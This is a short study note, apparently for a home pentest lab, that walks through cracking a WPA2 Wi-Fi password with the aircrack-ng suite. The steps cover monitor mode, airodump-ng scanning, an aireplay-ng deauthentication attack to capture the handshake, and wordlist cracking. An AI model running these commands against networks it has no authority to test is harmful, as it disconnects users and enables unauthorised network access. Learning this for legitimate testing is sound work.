Wireless Penetration Test

Assessment of a wireless network:

1. WPA2 PSK(Pre Share Key): Password that you type in order to connect to the network at your home. 
2. WPA2 Enterprise: That will use something called RADIUS or some sort of credentials to log into the network, and that is a more advanced environment. 

Activities Performed:

1. Evaluating strength of PSK
2. Reviewing nearby networks
3. Assessing guest networks
4. Checking network access

Tools being used:

1. Wireless card: Alfa AWUD036NH
2. Router: tp-link AC2300 Wireless
3. Laptop

A wireless card is something which is used to inject packets and listen to packets

Hacking Process:

1. Place: Place wireless card into monitor mode.
2. Discover: Discover information about network:
	1. Channel
	2. BSSID([[MAC Addresses |MAC Address]])
3. Select: Select network and capture data.
4. Perform: Perform deauth attack.
5. Capture: Capture WPA handshake.
6. Attempt: Attempt to crack the handshake.

When you connect the wireless card to your kali machine, you can check whether it has connected successfully using the following command on terminal:

```bash
iwconfig
```

We need to place our wireless card in monitor mode. 

```bash
airmon-ng check kill
```

```bash
airmon-ng start wlan0
```

Next we can search the surrounding area and see where the network we want to attack is:

```shell
airodump-ng wlan0mon
```

The lower the -ve number is in the PWR, the closer to we are to the device. 

Once we know what channel we need to hit, we can narrow down our searches by using this command:

```bash
airodump-ng -c 6 --bssid <MAC> -w capture wlan0mon
```

We can speed this process up by using a deauth attack, which basically means we are kicking someone out of the network for a short period of time. So what happens is, when a client re-associates, we capture his handshake and that is what we want.

We can do the deauth attack by:

```bash
aireplay-ng -0 1 -a <MAC> -c <Station> wlan0mon
```

You dont want to deauth the same client over and over.

You can then use the capture to find the passphrase for the network you're trying to connect to:

```bash
aircrack-ng -w <path_of_wordlist> -b <MAC> <name_of_capture>
```

